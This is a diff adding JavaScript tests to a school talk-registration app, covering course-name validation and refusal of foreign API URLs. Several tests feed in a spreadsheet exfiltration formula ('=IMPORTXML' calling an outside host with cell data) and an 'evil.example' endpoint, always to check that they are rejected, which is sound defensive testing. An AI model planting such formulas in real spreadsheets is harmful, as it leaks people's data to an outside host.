@@ -85,6 +85,13 @@ function finish() {
   summary();
 }
 
+process.once('exit', function () {
+  if (!summarized) {
+    console.error('FAIL tests did not finish, ' + asyncPending + ' async test(s) pending');
+    process.exitCode = 1;
+  }
+});
+
 function assertEq(a, b, msg) {
   if (a !== b) throw new Error((msg || '') + ' got ' + JSON.stringify(a) + ' expected ' + JSON.stringify(b));
 }
@@ -173,6 +180,14 @@ t('validateStudentInput rejects bad email, short name and unknown year', () => {
   assertEq(Core.validateStudentInput('juana@esc', 'Juana Perez', '2°A').error, 'email');
   assertEq(Core.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'J', '2°A').error, 'nombre');
   assertEq(Core.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', 'CB').error, 'curso');
+});
+
+t('validateStudentInput canonicalizes the course and rejects formulas', () => {
+  assertEq(Core.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', ' 2 b ').curso, '2°B');
+  assertEq(Core.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', '5 turismo').curso, '5°Turismo');
+  ['=1+2', '=IMPORTXML("https://x/?"&B2,"//y")', '+1', '-1', '@1', '2°A=1'].forEach((c) => {
+    assertEq(Core.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', c).error, 'curso', 'core ' + c);
+  });
 });
 
 t('insert when talk free', () => {
@@ -271,6 +286,10 @@ t('Panel EsiClient parity: validateStudentInput', () => {
   ['ok', 'email', 'nombre', 'nombreKey', 'ciclo'].forEach((k) => assertEq(a[k], b[k], 'key ' + k));
   assertEq(Client.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'J', '2°A').error, 'nombre');
   assertEq(Client.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', 'CB').error, 'curso');
+  assertEq(Client.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', ' 2 b ').curso, '2°B');
+  ['=1+2', '=IMPORTXML("https://x/?"&B2,"//y")', '2°A=1'].forEach((c) => {
+    assertEq(Client.validateStudentInput('juana@secundariosalsipuedes.edu.ar', 'Juana Perez', c).error, 'curso', 'client ' + c);
+  });
 });
 
 t('Panel EsiClient parity: planRegistration scenarios', () => {
@@ -288,16 +307,17 @@ t('Panel EsiClient parity: planRegistration scenarios', () => {
   });
 });
 
-t('Code.gs exposes all API functions referenced by API_FN_MAP_', () => {
+t('Code.gs maps every public api function in both directions', () => {
   const m = codeSrc.match(/var API_FN_MAP_ = \{([\s\S]*?)\};/);
   if (!m) throw new Error('API_FN_MAP_ missing');
   const names = [...m[1].matchAll(/(\w+):/g)].map((x) => x[1]);
-  if (names.length !== 30) throw new Error('expected 30 api fns, got ' + names.length);
-  const want = ['apiBootstrap', 'apiLookup', 'apiGetData', 'apiResumeSession', 'apiStudentLogout', 'apiRegister', 'apiSetReminder', 'apiAdminLogin', 'apiAdminGetData', 'apiAdminSetOpen', 'apiAdminDeleteSignup', 'apiAdminImportRoster', 'apiAdminTalkRoster', 'apiAdminPending', 'apiAdminSetPresent', 'apiAdminReports', 'apiAdminMailPreview', 'apiAdminSendReminders', 'apiAdminGetConfig', 'apiAdminSetConfig', 'apiAdminStatus', 'apiAdminDuplicates', 'apiAdminAddStudent', 'apiAdminCorrectStudent', 'apiAdminMoveTalk', 'apiAdminMergeDuplicates', 'apiAdminDeleteStudent', 'apiAdminDeleteTestData', 'apiAdminCloseEvent', 'apiAdminErasePersonalData'];
-  want.forEach((n) => {
-    if (!names.includes(n)) throw new Error('missing in map: ' + n);
-    if (!new RegExp('function ' + n + '\\(').test(codeSrc)) throw new Error('missing function ' + n);
-  });
+  const defined = [...codeSrc.matchAll(/^function (api[A-Za-z0-9_]+)\(/gm)].map((x) => x[1]);
+  const unmapped = defined.filter((n) => n !== 'apiJsonp_' && !names.includes(n));
+  if (unmapped.length) throw new Error('function missing from map: ' + unmapped.join(', '));
+  const broken = names.filter((n) => !defined.includes(n));
+  if (broken.length) throw new Error('map points to a missing function: ' + broken.join(', '));
+  assertEq(names.length, defined.length - 1, 'every public api is exposed');
+  if (!names.includes('apiLookupDni')) throw new Error('apiLookupDni is not reachable over JSONP');
 });
 
 t('Code.gs serves JSONP router in doGet', () => {
@@ -341,7 +361,16 @@ t('Panel transport requires an explicit demo or a backend', () => {
   assertEq(t2, 'demo', 'explicit demo');
   const apiStore = { esi_api: 'https://example.com/exec' };
   const t3 = new Function('window', 'document', panelSrc + '\nreturn TRANSPORT;')(makeWin('', apiStore), doc);
-  assertEq(t3, 'jsonp', 'stored api');
+  assertEq(t3, 'unconfigured', 'foreign api is ignored');
+  const good = 'https://script.google.com/macros/s/AKfy_test/exec';
+  const goodStore = {};
+  const t4 = new Function('window', 'document', panelSrc + '\nreturn TRANSPORT;')(makeWin('?api=' + good, goodStore), doc);
+  assertEq(t4, 'jsonp', 'apps script api accepted');
+  assertEq(goodStore.esi_api, good, 'apps script api persisted');
+  const evilStore = { esi_api: good };
+  const t5 = new Function('window', 'document', panelSrc + '\nreturn TRANSPORT;')(makeWin('?api=https://evil.example/x', evilStore), doc);
+  assertEq(t5, 'unconfigured', 'foreign api in the url is refused');
+  assertEq(evilStore.esi_api, undefined, 'foreign api is not persisted');
 });
 
 t('cursoFromParts: A/B for basic, Turismo/Economia for orientado', () => {
@@ -1711,6 +1740,24 @@ t('Cached reads are invalidated by writes', () => {
 });
 
 
+t('A ticket with an empty course or name takes the typed values', () => {
+  const services = backendStub({}, {
+    students: [['nueva@secundariosalsipuedes.edu.ar', '', '']],
+    signups: []
+  });
+  const api = backendApi(services, 'apiGetData, apiRegister');
+  const ticket = loginTicketFor(services, 'nueva@secundariosalsipuedes.edu.ar', '', '', '');
+  const login = api.apiGetData('', 'Nueva Alumna', '2°B', '', '', ticket);
+  assertEq(login.ok, true, 'ticket login with typed name and course');
+  assertEq(login.student.nombre, 'Nueva Alumna', 'name from the form');
+  assertEq(login.student.curso, '2°B', 'course from the form');
+  const ticket2 = loginTicketFor(services, 'nueva@secundariosalsipuedes.edu.ar', '', '', '');
+  const reg = api.apiRegister('', 'Nueva Alumna', '2°B', 'B2', '', '', ticket2);
+  assertEq(reg.ok, true, 'register with typed name and course');
+  const rows = services.sheets.Signups.data.slice(1).filter((r) => r[2] === 'nueva@secundariosalsipuedes.edu.ar');
+  assertEq(rows[0][4], '2°B', 'canonical course written');
+});
+
 t('Registering the same student and talk twice keeps one row', () => {
   const services = backendStub({}, {
     students: [['nueva@secundariosalsipuedes.edu.ar', 'Nueva Alumna', '1°A']],
@@ -2033,6 +2080,20 @@ t('apiRegister stores a sanitized name and rejects formula injection', () => {
   assertEq(ok.ok, true, 'valid name accepted');
   const row = services.sheets.Signups.data.slice(1).filter((r) => r[2] === 'nueva@secundariosalsipuedes.edu.ar')[0];
   assertEq(row[3], 'Ana María', 'name sanitized before write');
+});
+
+t('apiRegister rejects a formula in the course and stores it canonical', () => {
+  const services = backendStub({});
+  const api = backendApi(services, 'apiRegister');
+  const before = services.sheets.Signups.data.length;
+  const bad = api.apiRegister('nueva@secundariosalsipuedes.edu.ar', 'Ana Gomez',
+    '=IMPORTXML("https://x/?"&B2,"//y")', 'B1');
+  assertEq(bad.ok, false, 'formula course rejected');
+  assertEq(services.sheets.Signups.data.length, before, 'nothing written');
+  const ok = api.apiRegister('nueva@secundariosalsipuedes.edu.ar', 'Ana Gomez', ' 2 b ', 'B1');
+  assertEq(ok.ok, true, 'valid course accepted');
+  const row = services.sheets.Signups.data.slice(1).filter((r) => r[2] === 'nueva@secundariosalsipuedes.edu.ar')[0];
+  assertEq(row[4], '2°B', 'course canonical before write');
 });
 
 t('Reminder opt-in is stored per mail and filters recipients', () => {
